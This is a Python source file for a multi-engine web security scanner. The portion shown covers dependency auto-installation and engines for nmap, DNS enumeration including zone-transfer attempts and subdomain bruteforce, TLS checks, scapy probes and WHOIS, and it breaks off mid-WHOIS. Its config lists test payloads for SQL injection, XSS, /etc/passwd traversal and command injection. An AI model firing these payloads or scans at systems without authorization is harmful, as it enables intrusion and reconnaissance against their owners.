#!/usr/bin/env python3
"""
Indigo SCR v4.0 — 13-Engine Comprehensive Security Scanner
============================================================
Full-spectrum web application security scanner dengan 13 integrated engines.

ENGINES:
  Network Layer:
    1. NMAP       - Port scanning, service detection, banner grabbing
    2. DNS        - Full DNS enumeration (A, AAAA, MX, TXT, NS, CNAME, SOA)
    3. SSL/TLS    - Certificate analysis, cipher suite, SAN, expiry
    4. Scapy      - Packet capture, TCP/IP analysis, TTL, flags
    5. WHOIS      - Domain registration intelligence

  Web Layer:
    6. HTTP       - Multi-client HTTP (httpx sync + aiohttp async)
    7. HTML Parse - Multi-parser DOM analysis (bs4 + lxml + selectolax)
    8. JS Render  - Headless browser rendering (playwright)
    9. WAF Detect - Web Application Firewall fingerprinting

  Security Layer:
   10. ZAP        - OWASP ZAP active vulnerability scanning (PROPERLY CONFIGURED)
   11. Fingerprint- Technology fingerprinting (Wappalyzer patterns)
   12. Tech Detect- BuiltWith technology detection

  Intelligence Layer:
   13. Active Test- Custom active vulnerability tester (SQLi, XSS, LFI, RCE, SSTI)

CHANGELOG v4.0:
- 13 integrated engines (was 6)
- Properly configured ZAP for form-based SQLi/XSS testing
- New Active Form Tester engine with multi-technique payload injection
- Multi-client HTTP (httpx sync + aiohttp async)
- Multi-parser HTML (bs4 + lxml + selectolax)
- JavaScript rendering with Playwright
- Full DNS enumeration with dnspython
- Advanced SSL/TLS analysis with cryptography + pyOpenSSL
- Packet capture with scapy
- WHOIS intelligence
- Wappalyzer-based fingerprinting
- BuiltWith technology detection
- Comprehensive findings consolidation for ML pipeline
- [v4.1] ML Knowledge Pipeline integration (Y/N prompt after scan)

PIPELINE:
  Scanner (File 1) → [Y/N] → ML Knowledge (File 3) → Generator (File 2)

Dependency: Standalone + imported by indigo_ml_knowledge.py (File 3)
"""

import os
import sys
import json
import time
import socket
import ssl
import re
import hashlib
import base64
import asyncio
import threading
import subprocess
import signal
import struct
import binascii
import random
import string
import math
import warnings
import traceback
from datetime import datetime, timedelta
from urllib.parse import urlparse, urlencode, quote, unquote, urljoin
from collections import defaultdict, Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any, Optional, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum

warnings.filterwarnings("ignore")

# ============================================================
# HEAVY DEPENDENCY MANAGEMENT
# ============================================================
HEAVY_DEPS = [
    # (import_name, pip_name, description, optional)
    # --- Core Required ---
    ("numpy", "numpy", "Numerical computing", False),
    ("scipy", "scipy", "Scientific computing", False),
    ("sklearn", "scikit-learn", "Machine learning", False),
    ("requests", "requests", "HTTP client", False),
    ("bs4", "beautifulsoup4", "HTML parsing", False),
    ("lxml", "lxml", "Fast XML/HTML parser", False),
    ("dns.resolver", "dnspython", "DNS resolution", False),
    ("cryptography", "cryptography", "TLS/SSL crypto", False),
    ("OpenSSL", "pyOpenSSL", "OpenSSL bindings", False),
    ("nmap", "python-nmap", "Port scanning", False),
    ("whois", "python-whois", "WHOIS lookup", False),
    # --- Enhanced HTTP ---
    ("httpx", "httpx", "Modern HTTP client", True),
    ("aiohttp", "aiohttp", "Async HTTP client", True),
    # --- Enhanced Parsing ---
    ("selectolax", "selectolax", "Fast HTML parser", True),
    # --- JS Rendering ---
    ("playwright", "playwright", "Headless browser", True),
    # --- Network ---
    ("scapy", "scapy", "Packet manipulation", True),
    # --- Fingerprinting ---
    ("Wappalyzer", "python-Wappalyzer", "Tech fingerprinting", True),
    ("builtwith", "builtwith", "Technology detection", True),
    # --- Data ---
    ("pandas", "pandas", "Data analysis", True),
    ("xgboost", "xgboost", "Advanced ML", True),
    # --- ML ---
    ("joblib", "joblib", "Model persistence", True),
]

DEP_STATUS = {}

def install_dependencies():
    """Install all dependencies with progress tracking."""
    print("\n\033[36m" + "=" * 64)
    print("  INDIGO SCR v4.0: Dependency Manager")
    print("=" * 64 + "\033[0m")

    missing = []
    for import_name, pip_name, desc, optional in HEAVY_DEPS:
        try:
            __import__(import_name)
            DEP_STATUS[pip_name] = True
            tag = "\033[32m[OK]\033[0m"
        except ImportError:
            DEP_STATUS[pip_name] = False
            tag_str = "optional" if optional else "required"
            tag = f"\033[33m[??]\033[0m"
            missing.append((pip_name, optional))
        print(f"  {tag} {pip_name:<22} - {desc}")

    if not missing:
        print(f"\n  \033[32mAll {len(HEAVY_DEPS)} dependencies installed!\033[0m")
        time.sleep(1)
        return True

    req_count = sum(1 for _, opt in missing if not opt)
    opt_count = sum(1 for _, opt in missing if opt)
    print(f"\n  Missing: {req_count} required, {opt_count} optional")
    print(f"  Installing {len(missing)} packages...\n")

    failed_required = []
    failed_optional = []

    for pip_name, optional in missing:
        print(f"  [+] Installing {pip_name}...", end=" ", flush=True)
        try:
            result = subprocess.run(
                [sys.executable, "-m", "pip", "install", pip_name,
                 "--quiet", "--disable-pip-version-check"],
                capture_output=True, text=True, timeout=300
            )
            if result.returncode == 0:
                DEP_STATUS[pip_name] = True
                print("\033[32mOK\033[0m")
                # Post-install for playwright
                if pip_name == "playwright":
                    print(f"      Installing Playwright browsers...", end=" ", flush=True)
                    subprocess.run(
                        [sys.executable, "-m", "playwright", "install", "chromium"],
                        capture_output=True, text=True, timeout=600
                    )
                    print("\033[32mOK\033[0m")
            else:
                DEP_STATUS[pip_name] = False
                print(f"\033[31mFAILED\033[0m")
                if optional:
                    failed_optional.append(pip_name)
                else:
                    failed_required.append(pip_name)
        except Exception as e:
            DEP_STATUS[pip_name] = False
            print(f"\033[31mERROR: {e}\033[0m")
            if optional:
                failed_optional.append(pip_name)
            else:
                failed_required.append(pip_name)

    if failed_required:
        print(f"\n  \033[31mFAILED REQUIRED: {failed_required}\033[0m")
        print(f"  Run: pip install {' '.join(failed_required)}")
        return False

    if failed_optional:
        print(f"\n  \033[33mSkipped optional: {failed_optional}\033[0m")

    installed = sum(1 for v in DEP_STATUS.values() if v)
    print(f"\n  \033[32m{installed}/{len(HEAVY_DEPS)} dependencies ready!\033[0m")
    time.sleep(1)
    return True

# Run installer
install_dependencies()

# ============================================================
# CONDITIONAL IMPORTS
# ============================================================
def _try_import(name):
    try:
        return __import__(name)
    except ImportError:
        return None

import numpy as np
from scipy import stats as scipy_stats
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.preprocessing import StandardScaler
from sklearn.metrics import accuracy_score
import requests
from bs4 import BeautifulSoup
import lxml
import dns.resolver
from cryptography import x509
from cryptography.hazmat.backends import default_backend
import OpenSSL
import nmap
import whois

# Optional imports
httpx_lib = _try_import("httpx")
aiohttp_lib = _try_import("aiohttp")
selectolax_lib = _try_import("selectolax")
playwright_lib = _try_import("playwright")
scapy_lib = _try_import("scapy")
wappalyzer_lib = _try_import("Wappalyzer")
builtwith_lib = _try_import("builtwith")
pandas_lib = _try_import("pandas")
joblib_lib = _try_import("joblib")

HAS_HTTPX = httpx_lib is not None
HAS_AIOHTTP = aiohttp_lib is not None
HAS_SELECTOLAX = selectolax_lib is not None
HAS_PLAYWRIGHT = playwright_lib is not None
HAS_SCAPY = scapy_lib is not None
HAS_WAPPALYZER = wappalyzer_lib is not None
HAS_BUILTWITH = builtwith_lib is not None
HAS_PANDAS = pandas_lib is not None


# ============================================================
# GLOBAL CONFIGURATION
# ============================================================
GLOBAL_CONFIG = {
    # --- General ---
    "target_url": "",
    "target_host": "",
    "target_ip": "",
    "output_dir": "./indigo_results",
    "verbose": True,
    "max_workers": 5,

    # --- Engine 1: NMAP ---
    "nmap_enabled": True,
    "nmap_ports": "1-1000,3306,5432,8080,8443,27017,6379,9200",
    "nmap_scan_type": "-sV -sC -O",
    "nmap_timeout": 600,

    # --- Engine 2: DNS ---
    "dns_enabled": True,
    "dns_records": ["A", "AAAA", "MX", "TXT", "NS", "CNAME", "SOA", "CAA", "SRV", "PTR"],
    "dns_timeout": 10,
    "dns_bruteforce": True,
    "dns_wordlist_size": 50,

    # --- Engine 3: SSL/TLS ---
    "ssl_enabled": True,
    "ssl_ports": [443, 8443, 4443],
    "ssl_check_expiry": True,
    "ssl_check_ciphers": True,
    "ssl_check_protocols": True,
    "ssl_timeout": 15,

    # --- Engine 4: Scapy ---
    "scapy_enabled": True,
    "scapy_packet_count": 10,
    "scapy_timeout": 30,

    # --- Engine 5: WHOIS ---
    "whois_enabled": True,
    "whois_timeout": 15,

    # --- Engine 6: HTTP Client ---
    "http_enabled": True,
    "http_timeout": 30,
    "http_follow_redirects": True,
    "http_max_redirects": 10,
    "http_user_agents": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) Mobile/15E148",
    ],
    "http_async_enabled": True,
    "http_async_concurrent": 10,

    # --- Engine 7: HTML Parser ---
    "html_enabled": True,
    "html_extract_forms": True,
    "html_extract_scripts": True,
    "html_extract_meta": True,
    "html_extract_comments": True,
    "html_extract_links": True,
    "html_extract_emails": True,
    "html_extract_secrets": True,
    "html_multi_parser": True,

    # --- Engine 8: JS Renderer ---
    "js_render_enabled": True,
    "js_render_timeout": 30000,
    "js_render_wait": 3000,
    "js_render_screenshot": True,

    # --- Engine 9: WAF Detection ---
    "waf_enabled": True,
    "waf_test_payloads": [
        "' OR 1=1--",
        "<script>alert(1)</script>",
        "../../etc/passwd",
        "; cat /etc/passwd",
        "{{7*7}}",
    ],

    # --- Engine 10: ZAP ---
    "zap_enabled": True,
    "zap_api_key": "indigo-zap-key-12345",
    "zap_proxy_host": "127.0.0.1",
    "zap_proxy_port": 8090,
    "zap_spider_max_depth": 5,
    "zap_spider_max_children": 50,
    "zap_active_scan_policy": "Default Policy",
    "zap_active_scan_strength": 100,
    "zap_active_scan_alert_threshold": 1,
    "zap_forms_handler_enabled": True,
    "zap_ajax_spider_enabled": True,
    "zap_timeout": 900,

    # --- Engine 11: Fingerprinter ---
    "fingerprint_enabled": True,
    "fingerprint_wappalyzer": True,

    # --- Engine 12: Tech Detector ---
    "tech_detect_enabled": True,
    "tech_detect_builtin": True,

    # --- Engine 13: Active Form Tester ---
    "active_test_enabled": True,
    "active_test_sqli": True,
    "active_test_xss": True,
    "active_test_lfi": True,
    "active_test_rce": True,
    "active_test_ssti": True,
    "active_test_ssrf": True,
    "active_test_xxe": True,
    "active_test_timeout": 15,
    "active_test_delay": 0.5,
    "active_test_max_payloads": 30,
    "active_test_time_based_delay": 5,
}


# ============================================================
# UTILITY FUNCTIONS
# ============================================================
class Colors:
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    CYAN = "\033[36m"
    MAGENTA = "\033[35m"
    WHITE = "\033[37m"
    BOLD = "\033[1m"
    RESET = "\033[0m"

def cprint(msg, color=Colors.WHITE):
    print(f"{color}{msg}{Colors.RESET}")

def log_engine(num, name, status="running"):
    status_colors = {
        "running": Colors.CYAN,
        "success": Colors.GREEN,
        "warning": Colors.YELLOW,
        "error": Colors.RED,
        "skip": Colors.YELLOW,
    }
    color = status_colors.get(status, Colors.WHITE)
    sym = {"running": ">>", "success": "OK", "warning": "!!", "error": "XX", "skip": "--"}
    s = sym.get(status, ">>")
    print(f"  {color}[{s}] Engine {num:02d}: {name}{Colors.RESET}")

def resolve_host(url):
    """Resolve hostname from URL to IP."""
    try:
        parsed = urlparse(url)
        host = parsed.hostname or parsed.netloc
        if not host:
            return url, url
        ip = socket.gethostbyname(host)
        return host, ip
    except:
        return url, url

def safe_request(url, method="GET", timeout=15, headers=None, **kwargs):
    """Safe HTTP request with fallback."""
    default_headers = {
        "User-Agent": random.choice(GLOBAL_CONFIG["http_user_agents"]),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
    }
    if headers:
        default_headers.update(headers)

    try:
        if method.upper() == "GET":
            resp = requests.get(url, headers=default_headers, timeout=timeout,
                                verify=False, allow_redirects=True, **kwargs)
        elif method.upper() == "POST":
            resp = requests.post(url, headers=default_headers, timeout=timeout,
                                 verify=False, allow_redirects=True, **kwargs)
        else:
            resp = requests.request(method, url, headers=default_headers,
                                     timeout=timeout, verify=False, **kwargs)
        return resp
    except Exception as e:
        return None


# ============================================================
# ENGINE 1: NMAP PORT SCANNER
# ============================================================
class NmapEngine:
    """Port scanning, service detection, banner grabbing."""

    def __init__(self, config):
        self.config = config
        self.scanner = nmap.PortScanner() if config.get("nmap_enabled") else None

    def scan(self, target_ip, target_host=""):
        if not self.scanner:
            return {"enabled": False, "error": "NMAP disabled"}

        log_engine(1, "NMAP Port Scanner")
        result = {
            "enabled": True,
            "target_ip": target_ip,
            "ports_found": [],
            "services": [],
            "os_detection": {},
            "vulnerabilities": [],
            "banner_grabs": [],
            "scan_time_ms": 0,
        }

        try:
            start = time.time()
            ports = self.config.get("nmap_ports", "1-1000")
            scan_args = self.config.get("nmap_scan_type", "-sV -sC -O")

            print(f"      Scanning {target_ip} ports {ports}...")
            scan_result = self.scanner.scan(
                target_ip, ports, arguments=scan_args,
                timeout=self.config.get("nmap_timeout", 600)
            )

            elapsed = (time.time() - start) * 1000
            result["scan_time_ms"] = elapsed

            for host in self.scanner.all_hosts():
                host_data = scan_result.get("scan", {}).get(host, {})

                # OS Detection
                osmatch = host_data.get("osmatch", [])
                if osmatch:
                    result["os_detection"] = {
                        "name": osmatch[0].get("name", "Unknown"),
                        "accuracy": osmatch[0].get("accuracy", 0),
                        "family": osmatch[0].get("osclass", [{}])[0].get("osfamily", ""),
                        "vendor": osmatch[0].get("osclass", [{}])[0].get("vendor", ""),
                    }

                # Port scan results
                for proto in self.scanner[host].all_protocols():
                    ports_data = self.scanner[host][proto]
                    for port in sorted(ports_data.keys()):
                        port_info = ports_data[port]
                        port_entry = {
                            "port": port,
                            "protocol": proto,
                            "state": port_info.get("state", "unknown"),
                            "service": port_info.get("name", "unknown"),
                            "product": port_info.get("product", ""),
                            "version": port_info.get("version", ""),
                            "extra_info": port_info.get("extrainfo", ""),
                            "banner": port_info.get("name", "") + " " +
                                      port_info.get("product", "") + " " +
                                      port_info.get("version", ""),
                        }
                        result["ports_found"].append(port_entry)

                        if port_info.get("product") or port_info.get("version"):
                            result["services"].append({
                                "port": port,
                                "service": port_info.get("name", ""),
                                "product": port_info.get("product", ""),
                                "version": port_info.get("version", ""),
                            })

                        # Banner
                        if port_info.get("product"):
                            result["banner_grabs"].append({
                                "port": port,
                                "banner": f"{port_info.get('product', '')} {port_info.get('version', '')}".strip(),
                            })

                        # Known vulnerable services
                        product = (port_info.get("product", "") + " " +
                                   port_info.get("version", "")).lower()
                        vuln_checks = {
                            "apache 2.2": {"name": "Outdated Apache", "severity": "Medium",
                                           "type": "outdated_software"},
                            "nginx 1.": {"name": "Potentially outdated Nginx", "severity": "Low",
                                        "type": "outdated_software"},
                            "mysql 5.": {"name": "MySQL exposed", "severity": "High",
                                        "type": "exposed_service"},
                            "redis": {"name": "Redis exposed", "severity": "High",
                                     "type": "exposed_service"},
                            "mongodb": {"name": "MongoDB exposed", "severity": "High",
                                       "type": "exposed_service"},
                            "ftp": {"name": "FTP service", "severity": "Medium",
                                   "type": "insecure_protocol"},
                            "telnet": {"name": "Telnet service", "severity": "High",
                                      "type": "insecure_protocol"},
                        }
                        for pattern, vuln in vuln_checks.items():
                            if pattern in product:
                                vuln_entry = dict(vuln)
                                vuln_entry["port"] = port
                                vuln_entry["evidence"] = port_entry["banner"]
                                result["vulnerabilities"].append(vuln_entry)

            status = "success" if result["ports_found"] else "warning"
            log_engine(1, f"NMAP: {len(result['ports_found'])} ports found", status)

        except Exception as e:
            result["error"] = str(e)
            log_engine(1, f"NMAP: {e}", "error")

        return result


# ============================================================
# ENGINE 2: DNS ENUMERATION
# ============================================================
class DNSEngine:
    """Full DNS enumeration with dnspython."""

    def __init__(self, config):
        self.config = config

    def scan(self, target_host):
        if not self.config.get("dns_enabled"):
            return {"enabled": False}

        log_engine(2, "DNS Enumeration (dnspython)")
        result = {
            "enabled": True,
            "target_host": target_host,
            "records": {},
            "subdomains": [],
            "zone_transfer": False,
            "dnssec": False,
            "vulnerabilities": [],
            "scan_time_ms": 0,
        }

        try:
            start = time.time()

            # Query each record type
            for record_type in self.config.get("dns_records", []):
                try:
                    answers = dns.resolver.resolve(target_host, record_type)
                    records = []
                    for rdata in answers:
                        records.append(str(rdata))
                    result["records"][record_type] = records

                    # Extract IPs for later use
                    if record_type in ["A", "AAAA"]:
                        for ip in records:
                            if not result.get("target_ip"):
                                result["target_ip"] = ip
                except dns.resolver.NoAnswer:
                    pass
                except dns.resolver.NXDOMAIN:
                    pass
                except dns.resolver.NoNameservers:
                    pass
                except Exception:
                    pass

            # DNSSEC check
            try:
                dnssec_result = dns.resolver.resolve(target_host, "DNSKEY")
                if dnssec_result:
                    result["dnssec"] = True
            except:
                pass

            # Zone transfer attempt
            try:
                ns_records = result["records"].get("NS", [])
                for ns in ns_records:
                    ns_host = ns.rstrip(".")
                    try:
                        zt = dns.resolver.resolve(target_host, "AXFR",
                                                   nameserver=socket.gethostbyname(ns_host))
                        if zt:
                            result["zone_transfer"] = True
                            result["vulnerabilities"].append({
                                "name": "DNS Zone Transfer Allowed",
                                "severity": "High",
                                "type": "dns_zone_transfer",
                                "evidence": f"AXFR successful via {ns_host}",
                            })
                            break
                    except:
                        pass
            except:
                pass

            # Subdomain bruteforce (small wordlist)
            if self.config.get("dns_bruteforce"):
                subdomains = self._bruteforce_subdomains(target_host)
                result["subdomains"] = subdomains

            elapsed = (time.time() - start) * 1000
            result["scan_time_ms"] = elapsed

            total_records = sum(len(v) for v in result["records"].values())
            log_engine(2, f"DNS: {total_records} records, "
                       f"{len(result['subdomains'])} subdomains", "success")

        except Exception as e:
            result["error"] = str(e)
            log_engine(2, f"DNS: {e}", "error")

        return result

    def _bruteforce_subdomains(self, domain):
        """Small subdomain bruteforce."""
        common_subs = [
            "www", "mail", "ftp", "admin", "webmail", "smtp", "pop",
            "ns1", "ns2", "dns", "vpn", "api", "dev", "staging",
            "test", "beta", "demo", "app", "portal", "dashboard",
            "login", "auth", "sso", "cdn", "static", "assets",
            "media", "images", "files", "docs", "wiki", "git",
            "svn", "jenkins", "ci", "cd", "monitor", "grafana",
            "kibana", "elastic", "redis", "mongo", "mysql", "db",
            "backup", "old", "new", "internal", "private", "secret",
        ]

        found = []
        for sub in common_subs[:self.config.get("dns_wordlist_size", 50)]:
            try:
                fqdn = f"{sub}.{domain}"
                answers = dns.resolver.resolve(fqdn, "A")
                ips = [str(r) for r in answers]
                found.append({"subdomain": fqdn, "ips": ips})
            except:
                pass

        return found


# ============================================================
# ENGINE 3: SSL/TLS ANALYZER
# ============================================================
class SSLEngine:
    """Advanced SSL/TLS analysis with cryptography + pyOpenSSL."""

    def __init__(self, config):
        self.config = config

    def scan(self, target_host, ports=None):
        if not self.config.get("ssl_enabled"):
            return {"enabled": False}

        log_engine(3, "SSL/TLS Analyzer (cryptography + pyOpenSSL)")
        ports = ports or self.config.get("ssl_ports", [443])
        result = {
            "enabled": True,
            "target_host": target_host,
            "certificates": [],
            "vulnerabilities": [],
            "cipher_suites": [],
            "protocols": [],
            "scan_time_ms": 0,
        }

        try:
            start = time.time()

            for port in ports:
                cert_data = self._analyze_cert(target_host, port)
                if cert_data:
                    result["certificates"].append(cert_data)

                    # Check vulnerabilities
                    vulns = self._check_ssl_vulns(cert_data)
                    result["vulnerabilities"].extend(vulns)

            # Test supported protocols
            result["protocols"] = self._test_protocols(target_host, ports[0] if ports else 443)

            # Test cipher suites
            result["cipher_suites"] = self._test_ciphers(target_host, ports[0] if ports else 443)

            elapsed = (time.time() - start) * 1000
            result["scan_time_ms"] = elapsed

            cert_count = len(result["certificates"])
            vuln_count = len(result["vulnerabilities"])
            status = "warning" if vuln_count > 0 else "success"
            log_engine(3, f"SSL: {cert_count} certs, {vuln_count} issues", status)

        except Exception as e:
            result["error"] = str(e)
            log_engine(3, f"SSL: {e}", "error")

        return result

    def _analyze_cert(self, host, port):
        """Analyze SSL certificate."""
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            with socket.create_connection((host, port), timeout=self.config.get("ssl_timeout", 15)) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    der_cert = ssock.getpeercert(binary_form=True)
                    pem_cert = ssl.DER_cert_to_PEM_cert(der_cert)

                    # Parse with cryptography
                    cert = x509.load_pem_x509_certificate(
                        pem_cert.encode(), default_backend()
                    )

                    # Parse with pyOpenSSL
                    openssl_cert = OpenSSL.crypto.load_certificate(
                        OpenSSL.crypto.FILETYPE_PEM, pem_cert
                    )

                    # Extract SAN
                    san_list = []
                    try:
                        san_ext = cert.extensions.get_extension_for_class(
                            x509.SubjectAlternativeName
                        )
                        san_list = san_ext.value.get_values_for_type(x509.DNSName)
                    except:
                        pass

                    # Extract issuer
                    issuer_parts = []
                    for attr in cert.issuer:
                        issuer_parts.append(f"{attr.oid._name}={attr.value}")

                    # Extract subject
                    subject_parts = []
                    for attr in cert.subject:
                        subject_parts.append(f"{attr.oid._name}={attr.value}")

                    # Check expiry
                    not_after = cert.not_valid_after
                    days_left = (not_after - datetime.utcnow()).days

                    # Cipher info
                    cipher = ssock.cipher()

                    return {
                        "port": port,
                        "subject": ", ".join(subject_parts),
                        "issuer": ", ".join(issuer_parts),
                        "serial_number": str(cert.serial_number),
                        "not_before": cert.not_valid_before.isoformat(),
                        "not_after": cert.not_valid_after.isoformat(),
                        "days_until_expiry": days_left,
                        "san": san_list,
                        "signature_algorithm": cert.signature_algorithm_oid._name,
                        "version": cert.version.name,
                        "cipher": {
                            "name": cipher[0] if cipher else "",
                            "protocol": cipher[1] if cipher else "",
                            "bits": cipher[2] if cipher else 0,
                        },
                        "self_signed": cert.issuer == cert.subject,
                        "key_size": self._get_key_size(openssl_cert),
                        "fingerprint_sha256": openssl_cert.digest("sha256").decode(),
                    }
        except Exception as e:
            return {"port": port, "error": str(e)}

    def _get_key_size(self, cert):
        try:
            pubkey = cert.get_pubkey()
            return pubkey.bits()
        except:
            return 0

    def _check_ssl_vulns(self, cert_data):
        """Check SSL vulnerabilities."""
        vulns = []

        if cert_data.get("error"):
            return vulns

        # Expired certificate
        if cert_data.get("days_until_expiry", 999) < 0:
            vulns.append({
                "name": "SSL Certificate Expired",
                "severity": "High",
                "type": "ssl_expired",
                "evidence": f"Expired {abs(cert_data['days_until_expiry'])} days ago",
                "port": cert_data.get("port"),
            })

        # Expiring soon
        elif cert_data.get("days_until_expiry", 999) < 30:
            vulns.append({
                "name": "SSL Certificate Expiring Soon",
                "severity": "Medium",
                "type": "ssl_expiring",
                "evidence": f"Expires in {cert_data['days_until_expiry']} days",
                "port": cert_data.get("port"),
            })

        # Self-signed
        if cert_data.get("self_signed"):
            vulns.append({
                "name": "Self-Signed SSL Certificate",
                "severity": "Medium",
                "type": "ssl_self_signed",
                "evidence": "Certificate is self-signed",
                "port": cert_data.get("port"),
            })

        # Weak key
        key_size = cert_data.get("key_size", 0)
        if 0 < key_size < 2048:
            vulns.append({
                "name": "Weak SSL Key Size",
                "severity": "High",
                "type": "ssl_weak_key",
                "evidence": f"Key size: {key_size} bits (minimum 2048)",
                "port": cert_data.get("port"),
            })

        # Weak cipher
        cipher_bits = cert_data.get("cipher", {}).get("bits", 0)
        if 0 < cipher_bits < 128:
            vulns.append({
                "name": "Weak Cipher Suite",
                "severity": "High",
                "type": "ssl_weak_cipher",
                "evidence": f"Cipher bits: {cipher_bits}",
                "port": cert_data.get("port"),
            })

        return vulns

    def _test_protocols(self, host, port):
        """Test supported SSL/TLS protocols."""
        protocols = []
        test_protos = [
            ("SSLv2", ssl.PROTOCOL_TLS),
            ("SSLv3", ssl.PROTOCOL_TLS),
            ("TLSv1.0", ssl.PROTOCOL_TLS),
            ("TLSv1.1", ssl.PROTOCOL_TLS),
            ("TLSv1.2", ssl.PROTOCOL_TLS),
            ("TLSv1.3", ssl.PROTOCOL_TLS),
        ]

        for name, proto in test_protos:
            try:
                ctx = ssl.SSLContext(proto)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                with socket.create_connection((host, port), timeout=5) as sock:
                    with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                        version = ssock.version()
                        if version:
                            protocols.append({
                                "protocol": name,
                                "version": version,
                                "supported": True,
                            })
            except:
                protocols.append({"protocol": name, "supported": False})

        return protocols

    def _test_ciphers(self, host, port):
        """Test supported cipher suites."""
        ciphers_found = []
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            with socket.create_connection((host, port), timeout=10) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    cipher = ssock.cipher()
                    if cipher:
                        ciphers_found.append({
                            "name": cipher[0],
                            "protocol": cipher[1],
                            "bits": cipher[2],
                            "active": True,
                        })
        except:
            pass

        return ciphers_found


# ============================================================
# ENGINE 4: SCAPY PACKET CAPTURE
# ============================================================
class ScapyEngine:
    """Packet capture and TCP/IP analysis."""

    def __init__(self, config):
        self.config = config
        self.available = HAS_SCAPY and config.get("scapy_enabled")

    def scan(self, target_ip, target_host=""):
        if not self.available:
            return {"enabled": False, "error": "Scapy not available"}

        log_engine(4, "Packet Capture (scapy)")
        result = {
            "enabled": True,
            "target_ip": target_ip,
            "tcp_handshake": {},
            "ttl_analysis": {},
            "os_fingerprint": "",
            "flags_analysis": [],
            "vulnerabilities": [],
            "scan_time_ms": 0,
        }

        try:
            from scapy.all import (
                IP, TCP, sr1, sr, ICMP, Ether, ARP, conf
            )
            conf.verb = 0  # Suppress output

            start = time.time()

            # TCP SYN handshake analysis
            try:
                syn_pkt = IP(dst=target_ip) / TCP(dport=80, flags="S", seq=1000)
                syn_ack = sr1(syn_pkt, timeout=5, verbose=0)

                if syn_ack and syn_ack.haslayer(TCP):
                    tcp_layer = syn_ack.getlayer(TCP)
                    result["tcp_handshake"] = {
                        "syn_ack_received": True,
                        "initial_seq": tcp_layer.seq,
                        "ack_num": tcp_layer.ack,
                        "flags": str(tcp_layer.flags),
                        "window_size": tcp_layer.window,
                        "options": str(tcp_layer.options),
                    }

                    # TTL analysis for OS detection
                    ttl = syn_ack.ttl
                    result["ttl_analysis"] = {
                        "ttl": ttl,
                        "estimated_os": self._guess_os_from_ttl(ttl),
                    }
                else:
                    result["tcp_handshake"] = {"syn_ack_received": False}
            except Exception as e:
                result["tcp_handshake"] = {"error": str(e)}

            # ICMP analysis
            try:
                icmp_pkt = IP(dst=target_ip) / ICMP()
                icmp_resp = sr1(icmp_pkt, timeout=5, verbose=0)
                if icmp_resp:
                    result["ttl_analysis"]["icmp_ttl"] = icmp_resp.ttl
            except:
                pass

            elapsed = (time.time() - start) * 1000
            result["scan_time_ms"] = elapsed

            log_engine(4, f"Scapy: handshake={'OK' if result['tcp_handshake'].get('syn_ack_received') else 'FAIL'}, "
                       f"TTL={result['ttl_analysis'].get('ttl', 'N/A')}", "success")

        except Exception as e:
            result["error"] = str(e)
            log_engine(4, f"Scapy: {e}", "error")

        return result

    def _guess_os_from_ttl(self, ttl):
        """Guess OS from TTL value."""
        if ttl <= 64:
            return "Linux/Unix (TTL=64)"
        elif ttl <= 128:
            return "Windows (TTL=128)"
        elif ttl <= 255:
            return "Cisco/Network device (TTL=255)"
        return "Unknown"


# ============================================================
# ENGINE 5: WHOIS INTELLIGENCE
# ============================================================
class WHOISEngine:
    """Domain registration intelligence."""

    def __init__(self, config):
        self.config = config

    def scan(self, target_host):
        if not self.config.get("whois_enabled"):
            return {"enabled": False}

        log_engine(5, "WHOIS Intelligence")
        result = {
            "enabled": True,
            "target_host": target_host,
            "registrar": "",
            "creation_date": "",
            "expiration_date": "",
            "updated_date": "",
            "name_servers": [],
            "registrant": {},
            "status": [],
            "scan_time_ms": 0,
        }

        try:
            start = time.time()

            w = whois.whois(target_host)

            result["registrar"] = str(w.registrar) if w.registrar else ""

            # Handle date fields (can be list or single)
            for field_name in ["creation_date", "expiration_date", "updated_date"]:
                val = getattr(w, field_name, None)
                if val:
                    if isinstance(val, list):
                        val = val[0]
                    if hasattr(val, "isoformat"):
                        result[field_name] = val.isoformat()
                    else:
                        result[field_name] = str(val)

            # Name servers
            if w.name_servers:
                ns = w.name_servers if isinstance(w.name_servers, list) else [w.name_servers]
                result["name_servers"] = [str(n).lower() for n in ns]

            # Status
            if w.status:
                statuses = w.status if isinstance(w.status, list) else [w.status]
                result["status"] = [str(s) for s in statuses]

            # Registrant info
            result["registrant"] = {
                "name": str(w.get("name", "") or w.org or ""),
                "org": str(w.org or ""),
                "country": str(w.country or ""),
                "email": str(w.emails or "") if hasattr(w, "emails") else "",
            }

            # Domain age analysis
            if w.creation_date:
                creation = w.creation_date
                if isinstance(creation, list):
                    creation = creation[0]
                if hasattr(creation, "year"):
                    age_days = (datetime.now() - creation).days
                    result["domain_age_days"] = age_days

                    if age_days < 30:
                        result["vulnerabilities"] = [{
                            "name": "Very New Domain (< 30 days)",
                            "severity": "Medium",
                            "type": "new_domain",
                            "evidence": f"Domain age: {age_days} days",
                        }]

            elapsed = (time.time() - start) * 1000
            result["scan_time_ms"] = elapsed

            log_engine(5, f"WHOIS: registrar={result['registrar'][:30]}", "success")

        except Exception as e:
            result["error"] = str(e)
